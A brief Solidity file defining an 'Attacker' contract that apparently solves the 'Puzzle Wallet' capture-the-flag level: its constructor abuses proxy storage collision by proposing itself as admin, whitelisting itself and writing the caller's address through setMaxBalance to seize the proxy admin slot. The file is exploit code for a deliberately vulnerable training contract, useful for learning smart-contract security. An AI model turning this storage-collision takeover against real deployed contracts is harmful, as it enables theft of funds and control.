//SPDX-License-Identifier:MIT

pragma solidity ^0.8.16;
import {PuzzleWallet, PuzzleProxy} from "./PuzzleWallet.sol";

contract Attacker{
    constructor(address payable instance){  
        PuzzleProxy(instance).proposeNewAdmin(address(this));
        PuzzleWallet(instance).addToWhitelist(address(this));
        PuzzleWallet(instance).setMaxBalance(uint256(uint160(msg.sender)));
    }

}
